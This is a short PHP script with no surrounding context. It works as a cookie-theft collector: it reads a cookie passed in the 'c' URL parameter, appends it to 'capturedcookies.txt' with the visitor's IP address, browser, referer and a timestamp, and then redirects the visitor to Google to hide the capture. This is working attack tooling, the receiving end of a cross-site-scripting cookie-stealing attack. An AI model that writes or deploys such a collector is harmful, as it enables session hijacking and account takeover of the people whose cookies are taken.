<?php
$cookie = $_GET['c'];
$date=date("j F, Y, g:i a");;
$referer = getenv('HTTP_REFERER');
$userip = getenv('REMOTE_ADDR');
$userbrowser = getenv('HTTP_USER_AGENT');
$fp = fopen('capturedcookies.txt', 'a');
fwrite($fp, '***|CapturedCookie: '.$cookie.'|Date and Time: '.$date.'|Referer: '.$referer.'|UserIP: '.$userip.'|UserBrowser: '.$userbrowser.'|***');
fclose($fp);
header ("Location: http://www.google.com");
?>
